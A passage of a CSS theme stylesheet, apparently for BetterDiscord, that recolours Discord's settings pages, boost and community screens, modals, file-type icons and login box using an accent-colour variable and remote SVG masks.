	box-shadow: 0 0 0 1px rgb(var(--vaccentcolor)), 0 0 0 2px rgba(var(--vaccentcolor), 0.6), 0 0 0 3px rgba(var(--vaccentcolor), 0.3);
}

#app-mount .activeButton-1BJAiN,							/* pagination			button								*/
#app-mount .activeButton-1BJAiN:hover {
	background-color: rgb(var(--vaccentcolor));
}

															/* categorylist			selected item						*/
.categoryItem-3zFJns.selectedCategoryItem-3X8ujp .itemInner-3gVXMG {
	background-color: rgb(var(--vaccentcolor));
}

.categoryPill-34fszg.selected-1dONk0 {						/* categorylist			search categorypill					*/
	background-color: rgb(var(--vaccentcolor));
}


/* ~~~~		8.		USERSETTINGS					~~~~ */

.item-PXvHYJ[style^="color: rgb(114, 137, 218)"],
.item-PXvHYJ[style*=" color: rgb(114, 137, 218)"] {			/* settingsitems		list item							*/
	color: rgb(var(--vaccentcolor)) !important;
}
.item-PXvHYJ[style*="background-color: rgb(114, 137, 218)"] {
	background-color: rgb(var(--vaccentcolor)) !important;
}
.item-PXvHYJ[style*="background-color: rgba(114, 137, 218, 0.1)"] {
	background-color: rgb(var(--vaccentcolor), 0.1) !important;
}


.dot-2s_oHI {												/* settingsitems		dot									*/
	background-color: rgb(var(--vaccentcolor));
}

.cardBrand-39zmMQ {											/* settingsitems		card								*/
	background-color: rgb(var(--vaccentcolor));
}
.cardBrand-39zmMQ,
.cardBrandOutline-3jvFfo {
	border-color: rgb(var(--vaccentcolor));
}

.avatarUploaderInner-3UNxY3 {								/* accountsettings		avatar upload						*/
	background-color: rgb(var(--vaccentcolor));
}

#app-mount .questionMark-CWEQZn,							/* accountsettings		questionmark						*/
#app-mount .questionMark-3qBhGj {							/* accountsettings		questionmark new					*/
	background-color: rgb(var(--vaccentcolor));
}
#app-mount .questionMark-CWEQZn:hover,
#app-mount .questionMark-3qBhGj:hover {
	background: var(--vaccentcolor-hover);
}

.marketingLogoImage-2SzXIR {								/* boostsettings		boost header						*/
	position: relative;
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/guildsettings_boostheader_bg.svg) center/cover no-repeat;
}
.marketingLogoImage-2SzXIR::after {
	content: "";
	position: absolute;
	top: 0;
	right: 0;
	bottom: 0;
	left: 0;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/guildsettings_boostheader_accent.svg) center/cover no-repeat;
}
#app-mount .tierUnlocked-27DwHo {							/* boostsettings		tierunlocked						*/
	color: rgb(var(--vaccentcolor));
}
#app-mount .tierAccomplished-2eXPdI,
#app-mount .tierCurrent-Lw7-4E,
#app-mount .tierDefault-2qaRkD {
	background: #ffcd4b linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
#app-mount .tierCloseHint-380zIA {							/* boostsettings		tierclosehint						*/
	background-color: rgb(var(--vaccentcolor));
}
#app-mount .tierCloseHint-380zIA::before {
	border-right-color: rgb(var(--vaccentcolor));
}
#app-mount .tierHeaderUnlockedBackground-MW5XJU {			/* boostsettings		tierheaderunlockedbg				*/
	background: #ffcd4b linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
.emojiIcon-2xOPMD {											/* boostsettings		perkicon emoji						*/
	color: rgb(var(--vaccentcolor));
	filter: brightness(75%);
}
.uploadSizeIcon-2HNa5p {									/* boostsettings		perkicon upload						*/
	color: rgb(var(--vaccentcolor));
}
.memberBadgeIcon-1hpSQc {									/* boostsettings		perkicon guild						*/
	color: rgb(var(--vaccentcolor));
	filter: brightness(150%);
}
.profileBadgeIcon-_ctnKj {
	position: relative;
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/usersettings_boostbadge_bg.svg) center/contain no-repeat;
}
.profileBadgeIcon-_ctnKj::after {
	content: "";
	position: absolute;
	top: 0;
	right: 0;
	bottom: 0;
	left: 0;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/usersettings_boostbadge_accent.svg) center/contain no-repeat;
}
.premiumGuildIcon-13KUPa {									/* boostsettings		sub count icon						*/
	color: rgb(var(--vaccentcolor));
}
.gemWithLabel-2aecE_ {										/* boostsettings		progress label						*/
	color: rgb(var(--vaccentcolor));
}
.gemIndicatorProgressCircle-3wDFa1 {						/* boostsettings		progress circle						*/
	color: rgb(var(--vaccentcolor));
}
.guildSubscriberCountIcon-6Fo5EK {							/* boostsettings		sub count							*/
	color: rgb(var(--vaccentcolor));
}
.guildSubscriptionSlotIcon-EVE04u {							/* boostsettings		slot icon							*/
	color: rgb(var(--vaccentcolor));
}

.icon-3j1dJB {												/* hypesettings			perk icon							*/
	position: relative;
}
.icon-3j1dJB::after {
	content: "";
	position: absolute;
	top: 0;
	right: 0;
	bottom: 0;
	left: 0;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/empty.svg) center/cover no-repeat;
}
.perkNewsletter-2lxlA1 {
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/usersettings_hypeperk1_bg.svg) center/cover no-repeat;
}
.perkNewsletter-2lxlA1::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/usersettings_hypeperk1_accent.svg) center/cover no-repeat;
}
.perkBadge-2la1kc {
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/usersettings_hypeperk2_bg.svg) center/cover no-repeat;
}
.perkBadge-2la1kc::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/usersettings_hypeperk2_accent.svg) center/cover no-repeat;
}
.perkChallenges-19qHzw {
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/usersettings_hypeperk3_bg.svg) center/cover no-repeat;
}
.perkChallenges-19qHzw::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/usersettings_hypeperk3_accent.svg) center/cover no-repeat;
}

.wrapper-3jrx9n {											/* overlaysettings		positionsettings wrapper			*/
	border-color: rgb(var(--vaccentcolor));
}
.option-n0icdO:hover {										/* overlaysettings		positionoption						*/
	background-color: rgb(var(--vaccentcolor));
}
.selected-mKYnfr.option-n0icdO {
	background-color: rgb(var(--vaccentcolor));
	border-color: rgb(var(--vaccentcolor));
}
															/* streamermodesettings	headerimage							*/
.noticeIcon-1phvR2[src="/assets/616e078b351d0df460971441949c53a3.svg"] {
	object-position: -999999px -999999px;
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/guildsettings_streamermode_bg.svg) center/contain no-repeat;
}
.noticeIcon-1phvR2[src="/assets/616e078b351d0df460971441949c53a3.svg"] + * {
	position: relative;
}
.noticeIcon-1phvR2[src="/assets/616e078b351d0df460971441949c53a3.svg"] + *::before,
.noticeIcon-1phvR2[src="/assets/616e078b351d0df460971441949c53a3.svg"] + *::after {
	content: "";
	position: absolute;
	top: 0;
	right: -204px;
	width: 184px;
	height: 110px;
}
.noticeIcon-1phvR2[src="/assets/616e078b351d0df460971441949c53a3.svg"] + *::before {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/guildsettings_streamermode_accent.svg) center/contain no-repeat;
}
.noticeIcon-1phvR2[src="/assets/616e078b351d0df460971441949c53a3.svg"] + *::after {
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/guildsettings_streamermode_details.svg) center/contain no-repeat;
}


/* ~~~~		9.		GUILDSETTINGS					~~~~ */
															/* widgetsettings		widget placeholder image 			*/
.layer-3QrUeG[aria-label="GUILD_SETTINGS"] .contentRegion-3nDuYy .contentColumn-2hrIYH > div > div > .divider-3573oO + .flex-1xMQg5 + .divider-3573oO + .flex-1xMQg5:last-of-type {
	position: relative !important;
}
.layer-3QrUeG[aria-label="GUILD_SETTINGS"] .contentRegion-3nDuYy .contentColumn-2hrIYH > div > div > .divider-3573oO + .flex-1xMQg5 + .divider-3573oO + .flex-1xMQg5:last-of-type img[src="/assets/5fb477ca84edd15d9a2888ac28365acd.svg"] {
	object-position: -999999px -999999px;
	flex: unset !important;
	height: 310px !important;
	min-width: 320px !important;
	background: var(--background-tertiary);
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/guildsettings_widget_bg.svg) center/contain no-repeat;
}
.layer-3QrUeG[aria-label="GUILD_SETTINGS"] .contentRegion-3nDuYy .contentColumn-2hrIYH > div > div > .divider-3573oO + .flex-1xMQg5 + .divider-3573oO + .flex-1xMQg5:last-of-type::before,
.layer-3QrUeG[aria-label="GUILD_SETTINGS"] .contentRegion-3nDuYy .contentColumn-2hrIYH > div > div > .divider-3573oO + .flex-1xMQg5 + .divider-3573oO + .flex-1xMQg5:last-of-type::after {
	content: "";
	position: absolute;
	right: 0;
	bottom: 0;
	width: 320px;
	height: 310px;
}
.layer-3QrUeG[aria-label="GUILD_SETTINGS"] .contentRegion-3nDuYy .contentColumn-2hrIYH > div > div > .divider-3573oO + .flex-1xMQg5 + .divider-3573oO + .flex-1xMQg5:last-of-type::before {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/guildsettings_widget_accent.svg) center/contain no-repeat;
}
.layer-3QrUeG[aria-label="GUILD_SETTINGS"] .contentRegion-3nDuYy .contentColumn-2hrIYH > div > div > .divider-3573oO + .flex-1xMQg5 + .divider-3573oO + .flex-1xMQg5:last-of-type::after {
	background: var(--header-primary);
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/guildsettings_widget_details.svg) center/contain no-repeat;
}

@-webkit-keyframes pulseBorder-1LZYy9 { 					/* intergrationsettings	new webhook							*/
	0% {border-color: transparent;}
	50% {border-color: rgb(var(--vaccentcolor));}
	to {border-color: transparent;}
}
@keyframes pulseBorder-1LZYy9 {
	0% {border-color: transparent;}
	50% {border-color: rgb(var(--vaccentcolor));}
	to {border-color: transparent;}
}


.placeholderImage-37MstR {									/* discoverysettings	insight								*/
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/guildsettings_insight_bg.svg) center/cover no-repeat;
}
.placeholderImage-37MstR::after {
	content: "";
	position: absolute;
	top: 0;
	right: 0;
	bottom: 0;
	left: 0;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/guildsettings_insight_accent.svg) center/cover no-repeat;
}
															/* discoverysettings	partner program						*/
.banner-2AwsUs[src="/assets/b3d9ebeb2259945abe78c49206f5b62d.svg"] {
	object-position: -999999px -999999px;
	filter: grayscale(0.5);
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/guildsettings_partnerprogram_bg.svg) center/cover no-repeat;
}
.banner-2AwsUs[src="/assets/b3d9ebeb2259945abe78c49206f5b62d.svg"] + * {
	position: relative;
	display: flex;
	justify-content: center;
}
.banner-2AwsUs[src="/assets/b3d9ebeb2259945abe78c49206f5b62d.svg"] + *::after {
	content: "";
	position: absolute;
	top: -281px;
    width: 428px;
    height: 241px;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/guildsettings_partnerprogram_accent.svg) center/cover no-repeat;
}

.defaultIcon-2NMkWn {										/* discoverysettings	default guildicon					*/
	background-color: rgb(var(--vaccentcolor));
}

															/* discoverysettings	requirements icon					*/
.requirementsImage-tqIP2X[src="/assets/ec3ea47d6b85de83ab2c298ddecf7df2.svg"],
.headerIcon-2S6VR5[src="/assets/8bfa6300dd6ce22829ffa093fb87da9f.svg"] {
	object-position: -999999999px -999999999px;
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/guildsettings_requirements_bg.svg) center/cover no-repeat;
}
.requirementsImage-tqIP2X[src="/assets/ec3ea47d6b85de83ab2c298ddecf7df2.svg"] + *,
.headerIcon-2S6VR5[src="/assets/8bfa6300dd6ce22829ffa093fb87da9f.svg"] + * {
	position: relative;
	height: 60px;
}
.requirementsImage-tqIP2X[src="/assets/ec3ea47d6b85de83ab2c298ddecf7df2.svg"] + *::after,
.headerIcon-2S6VR5[src="/assets/8bfa6300dd6ce22829ffa093fb87da9f.svg"] + *::after {
	content: "";
	position: absolute;
	left: -56px;
	bottom: 10px;
	width: 40px;
	height: 40px;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/guildsettings_requirements_accent.svg) center/cover no-repeat;
}

.featureIcon-3p1TC_ [fill="#7289da" i] {					/* communitysettings	intro		featureicon				*/
	fill: rgb(var(--vaccentcolor));
}

.fakeButton-kGEmb3 {										/* communitysettings	rules		example fake			*/
	background-color: rgb(var(--vaccentcolor));
}

.exampleWumpus-3QIhvG .wumpus-3Q6pSF,						/* communitysettings	rules		wumpus					*/
.exampleWumpus-1zk2dq .wumpus-3JzuYd {						/* communitysettings	welcome		wumpus					*/
	object-position: -999999px -999999px;
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/guildsettings_wumpus_bg.svg) center/cover no-repeat;
}
.exampleWumpus-3QIhvG::after,
.exampleWumpus-1zk2dq::after {
	content: "";
	position: absolute;
	width: 82px;
	height: 72px;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/guildsettings_wumpus_accent.svg) center/cover no-repeat;
}
.exampleModal-2oh58d .guildInfo-3Co_-d,						/* communitysettings	rules		wumpus icon				*/
.exampleModal-2X2Vf8 .guildIcon-1F8t_p + * {				/* communitysettings	rules		wumpus icon				*/
	position: relative;
}
.exampleModal-2X2Vf8 .guildIcon-1F8t_p + * {
	display: flex;
	justify-content: center;
	white-space: pre;
}
.exampleModal-2oh58d .guildIcon-38Zs0M,
.exampleModal-2X2Vf8 .guildIcon-1F8t_p {
	object-position: -999999px -999999px;
	border-radius: 10px;
	background: white url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/guildsettings_wumpusicon_bg.svg) center/cover no-repeat;
}
.exampleModal-2oh58d .guildInfo-3Co_-d::after {
	top: 0;
	width: 48px;
	height: 48px;
}
.exampleModal-2X2Vf8 .guildIcon-1F8t_p + *::after {
	top: -80px;
	width: 64px;
	height: 64px;
}
.exampleModal-2oh58d .guildInfo-3Co_-d::after,
.exampleModal-2X2Vf8 .guildIcon-1F8t_p + *::after {
	content: "";
	position: absolute;
	border-radius: 10px;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/guildsettings_wumpusicon_accent.svg) center/cover no-repeat;
}


/* ~~~~		10.		MODALS							~~~~ */

/* ----		10.1.	USERMODAL						---- */

.topSectionPlaying-1J5E4n {									/* modal				topsection playing					*/
	background: rgb(var(--vaccentcolor));
}

.container-q03LZO.colored-1armap .profileBadgeBugHunterLevel1-dbEzVz {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://discordapp.com/assets/df26f079738a4dcd07cbce6eb3c957f1.svg) center/contain no-repeat;
}
.container-q03LZO.colored-1armap .profileBadgeBugHunterLevel2-3TUciC {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://discordapp.com/assets/16def052b03d75dac0ed9234c5d6a880.svg) center/contain no-repeat;
}
.container-q03LZO.colored-1armap .profileGuildSubscriberlvl1-3oI9tx {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://discordapp.com/assets/24e49184598820f274e62293349a2e43.svg) center/contain no-repeat;
}
.container-q03LZO.colored-1armap .profileGuildSubscriberlvl2-r6nJHT {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://discordapp.com/assets/cc73fba5c2e9b70752bbd1db35a1b9c3.svg) center/contain no-repeat;
}
.container-q03LZO.colored-1armap .profileGuildSubscriberlvl3-38s3Dj {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://discordapp.com/assets/a4c3939a9b03274246df9b144fcd86cf.svg) center/contain no-repeat;
}
.container-q03LZO.colored-1armap .profileGuildSubscriberlvl4-2NXrsI {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://discordapp.com/assets/d01bee8a9b41bd9dda26a43221b2e7e8.svg) center/contain no-repeat;
}
.container-q03LZO.colored-1armap .profileGuildSubscriberlvl5-3XIa2K {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://discordapp.com/assets/a99def5f819c077e5e5061cab741b7e6.svg) center/contain no-repeat;
}
.container-q03LZO.colored-1armap .profileGuildSubscriberlvl6-3e3sxW {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://discordapp.com/assets/2cfb317f3db3963d8ded9a97ee967bac.svg) center/contain no-repeat;
}
.container-q03LZO.colored-1armap .profileGuildSubscriberlvl7-1dVhQT {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://discordapp.com/assets/278736f579d810b11ddf308cb598b19e.svg) center/contain no-repeat;
}
.container-q03LZO.colored-1armap .profileGuildSubscriberlvl8-1kXdFr {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://discordapp.com/assets/38e40f25802a0fdf480d9b855a37a2f3.svg) center/contain no-repeat;
}
.container-q03LZO.colored-1armap .profileGuildSubscriberlvl9-1d6zav {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://discordapp.com/assets/cfbc2d8ceacfacf07850f986c8165195.svg) center/contain no-repeat;
}

.guildAvatarWithoutIcon-1sTmE_ {							/* modal				shared servers no icon				*/
	background-color: rgb(var(--vaccentcolor));
}

/* ----		10.2.	GUILDADD/CREATION				---- */
															/* create guild			create own icon						*/
.icon-QM5383[src="/assets/79516499036b21acd5f56ccba0635c38.svg"] {
	object-position: -999999px -999999px;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/guildcreate_createown_accent.svg) center/contain no-repeat;
}
.icon-QM5383[src="/assets/79516499036b21acd5f56ccba0635c38.svg"] + * {
	position: relative;
	display: flex;
	align-items: center;
	overflow: visible;
}
.icon-QM5383[src="/assets/79516499036b21acd5f56ccba0635c38.svg"] + *::after {
	content: "";
	position: absolute;
	left: -56px;
	width: 48px;
	height: 48px;
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/guildcreate_createown_bg.svg) center/contain no-repeat;
}

.uploadIcon-2IFzZU [fill="#7289da" i] {						/* create guild			upload icon							*/
	fill: rgb(var(--vaccentcolor));
}

/* ----		10.3.	REGIONSELECTMODAL				---- */

.regionSelectFlag-3uwFtG,									/* modal				regionselect flag					*/
.regionSelectFlag-1htPow {
	background-color: rgb(var(--vaccentcolor));
}
.vip-3pFIN8::after,											/* modal				regionselect vip					*/
.vip-1SuRbe::after {
	background: rgb(var(--vaccentcolor));
}
.regionSelect-3lf4eE button {								/* modal				regionselect button					*/
	color: rgb(var(--vaccentcolor));
}
#app-mount .regionSelect-3lf4eE:hover .regionSelectInner-24f4Ce,
#app-mount .regionSelect-3lf4eE:hover button {
	border-color: rgb(var(--vaccentcolor));
}
#app-mount .regionSelect-3lf4eE:hover button {
	background-color: rgb(var(--vaccentcolor));
}
.regionSelectModal-12e-57 .regionSelectModalHeader-21khC1 {	/* modal				regionselect header					*/
	color: rgb(var(--vaccentcolor));
}
															/* modal				regionselect option					*/
.regionSelectModal-12e-57 .regionSelectModalOption-2DSIZ3:hover {
	border-color: rgb(var(--vaccentcolor));
}
.check-2by_h9 {
	-webkit-mask: url(https://discordapp.com/assets/6acb20d5e709b34b6a7f36ec13648666.svg);
	background: rgb(var(--vaccentcolor));
}

/* ----		10.4.	UPLOADMODAL						---- */
															/* modal				background							*/
.uploadModalIn-1z07Bv .uploadDropModal-2kTwbc .bgScale-1otPtc {
	background-color: rgb(var(--vaccentcolor));
}

.attachment-33OFj0 .icon-1kp3fr,
.audioMetadata-3zOuGv::before,
.uploadModal-2ifh8j .icon-kyxXVr:not(.image-2yrs5j),
.uploadModalIn-1z07Bv .icon-kyxXVr:not(.image-2yrs5j) {
	object-position: -999999px -999999px;
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/files_bg.svg) center/contain no-repeat !important;
}
.attachment-33OFj0 .icon-1kp3fr + *::before,
.attachment-33OFj0 .icon-1kp3fr + *::after,
.audioMetadata-3zOuGv > *:first-child::before,
.audioMetadata-3zOuGv > *:first-child::after,
.uploadModal-2ifh8j .icon-kyxXVr:not(.image-2yrs5j)::before,
.uploadModal-2ifh8j .icon-kyxXVr:not(.image-2yrs5j)::after,
.uploadModalIn-1z07Bv .icon-kyxXVr:not(.image-2yrs5j)::before,
.uploadModalIn-1z07Bv .icon-kyxXVr:not(.image-2yrs5j)::after {
	content: "";
	position: absolute;
	background: rgb(var(--vaccentcolor));
}
.attachment-33OFj0 .icon-1kp3fr {
	background-size: 120% !important;
}
.audioMetadata-3zOuGv::before {
	background-position: center -4px !important;
	background-size: 140% !important;
}
.attachment-33OFj0 .icon-1kp3fr + *::before,
.attachment-33OFj0 .icon-1kp3fr + *::after {
	top: 9px;
	left: 8px;
	width: 36px;
	height: 48px;
}
.audioMetadata-3zOuGv > *:first-child::before,
.audioMetadata-3zOuGv > *:first-child::after {
	top: 0;
	left: 5px;
	width: 34px;
	height: 56px;
}
.uploadModal-2ifh8j .icon-kyxXVr:not(.image-2yrs5j)::before,
.uploadModal-2ifh8j .icon-kyxXVr:not(.image-2yrs5j)::after,
.uploadModalIn-1z07Bv .icon-kyxXVr:not(.image-2yrs5j)::before,
.uploadModalIn-1z07Bv .icon-kyxXVr:not(.image-2yrs5j)::after {
	width: 100px;
	height: 130px;
}
.uploadModalIn-1z07Bv .error-kKl9o2 .icon-kyxXVr:not(.image-2yrs5j)::before,
.uploadModalIn-1z07Bv .error-kKl9o2 .icon-kyxXVr:not(.image-2yrs5j)::after {
	background: rgb(240, 71, 71);
}
.attachment-33OFj0 .icon-1kp3fr + *::before,
.audioMetadata-3zOuGv > *:first-child::before,
.uploadModal-2ifh8j .icon-kyxXVr:not(.image-2yrs5j)::before,
.uploadModalIn-1z07Bv .icon-kyxXVr:not(.image-2yrs5j)::before {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/files_details.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr + *::after,
.uploadModal-2ifh8j .icon-kyxXVr.unknown-3TPTMr::after,
.uploadModal-2ifh8j .icon-kyxXVr:not(.image-2yrs5j)::after,
.uploadModalIn-1z07Bv .icon-kyxXVr:not(.image-2yrs5j)::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/empty.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr[title="acrobat"] + *::after,
.uploadModal-2ifh8j .icon-kyxXVr.acrobat-3K1PC6::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/files_acrobat_accent.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr[title="ae"] + *::after,
.uploadModal-2ifh8j .icon-kyxXVr.ae-1Y5Jq3::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/files_ae_accent.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr[title="ai"] + *::after,
.uploadModal-2ifh8j .icon-kyxXVr.ai-11KAaB::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/files_ai_accent.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr[title="archive"] + *::after,
.uploadModal-2ifh8j .icon-kyxXVr.archive-2hqXug::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/files_archive_accent.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr[title="audio"] + *::after,
.audioMetadata-3zOuGv > *:first-child::after,
.uploadModal-2ifh8j .icon-kyxXVr.audio-14DQXq::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/files_audio_accent.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr[title="code"] + *::after,
.uploadModal-2ifh8j .icon-kyxXVr.code-aoB-kL::after,
.uploadModalIn-1z07Bv .icon-kyxXVr.two-3BBQI9::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/files_code_accent.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr[title="document"] + *::after,
.uploadModal-2ifh8j .icon-kyxXVr.document-2cvI0u::after,
.uploadModalIn-1z07Bv .icon-kyxXVr.three-27ScFD::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/files_document_accent.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr[title="photoshop"] + *::after,
.attachment-33OFj0 .icon-1kp3fr[title="ps"] + *::after,
.uploadModal-2ifh8j .icon-kyxXVr.photoshop-1UWfyZ::after,
.uploadModal-2ifh8j .icon-kyxXVr.ps-2T6Jrl::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/files_photoshop_accent.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr[title="sketch"] + *::after,
.uploadModal-2ifh8j .icon-kyxXVr.sketch-ZMuo7D::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/files_sketch_accent.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr[title="spreadsheet"] + *::after,
.uploadModal-2ifh8j .icon-kyxXVr.spreadsheet-1QuSej::after,
.uploadModalIn-1z07Bv .icon-kyxXVr.one-2crnLX::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/files_spreadsheet_accent.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr[title="video"] + *::after,
.uploadModal-2ifh8j .icon-kyxXVr.video-27RLEH::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/files_video_accent.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr[title="webcode"] + *::after,
.uploadModal-2ifh8j .icon-kyxXVr.webcode-22GGLX::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/files_webcode_accent.svg) center/contain no-repeat;
}

/* ----		10.5.	KEYBOARDSHORTCUTSMODAL			---- */

.ddrArrows-lSnH7P .arrow-2enltQ,							/* modal				arrows								*/
.ddrArrows-lSnH7P .arrow-2enltQ::after {
	height: 50px;
	width: 50px;
}
.ddrArrows-lSnH7P .arrow-2enltQ.active-2X6Ewx {
	filter: brightness(130%);
}
.ddrArrows-lSnH7P .arrow-2enltQ {
	position: relative;
	animation: none !important;
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/keybinds_arrows_bg.svg) center/contain no-repeat !important;
}
.ddrArrows-lSnH7P .arrow-2enltQ::after {
	content: "";
	position: absolute;
	top: 0;
	left: 0;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/keybinds_arrows_accent.svg) center/contain no-repeat;
}
.ddrArrows-lSnH7P .arrow-2enltQ.down-2Ju7Q_ {
	transform: rotate(270deg);
}
.ddrArrows-lSnH7P .arrow-2enltQ.up-fkTose {
	transform: rotate(90deg);
}
.ddrArrows-lSnH7P .arrow-2enltQ.right-1AEPK3 {
	transform: rotate(180deg);
}


/* ----		10.6.	LOGINSCREEN						---- */

.authBox-hW6HRx a {											/* authobox				links								*/
	color: rgb(var(--vaccentcolor));
}

.authBox-hW6HRx img[src="/assets/0f4d1ff76624bb45a3fee4189279ee92.svg"] {
	object-position: -999999px -999999px;
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/login_authbox_bg.svg) center/cover no-repeat;
}
.authBox-hW6HRx img[src="/assets/0f4d1ff76624bb45a3fee4189279ee92.svg"] + * {
	position: relative;
	display: flex;
	justify-content: center;
}
.authBox-hW6HRx img[src="/assets/0f4d1ff76624bb45a3fee4189279ee92.svg"] + *::before {
	content: "";
	position: absolute;
	top: -107px;
	width: 124px;
	height: 84px;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/login_authbox_mask.svg) center/cover no-repeat;
}

.startOverButton-3q0wUV {									/* authobox				startover								*/
	color: rgb(var(--vaccentcolor));
}

/* ----		10.7.	DOWNLOADAPPMODAL				---- */

.downloadApps-wbBFdZ .footer-1nkeBm a {
	color: rgb(var(--vaccentcolor));
}
.downloadApps-wbBFdZ .platforms-28Rb-3 .platform-iik236.active-iLSdWQ {
	border-color: rgb(var(--vaccentcolor));
}
.downloadApps-wbBFdZ .platforms-28Rb-3 .platform-iik236.active-iLSdWQ p {
	color: rgb(var(--vaccentcolor));
}
.downloadApps-wbBFdZ .platforms-28Rb-3 .platform-iik236.active-iLSdWQ .downloadButton-1bWXpg {
	background-color: rgb(var(--vaccentcolor));
}
#app-mount .downloadApps-wbBFdZ .platforms-28Rb-3 .icon-2Pk7pb.active-iLSdWQ {
	background: rgb(var(--vaccentcolor));
	-webkit-mask-size: cover;
}
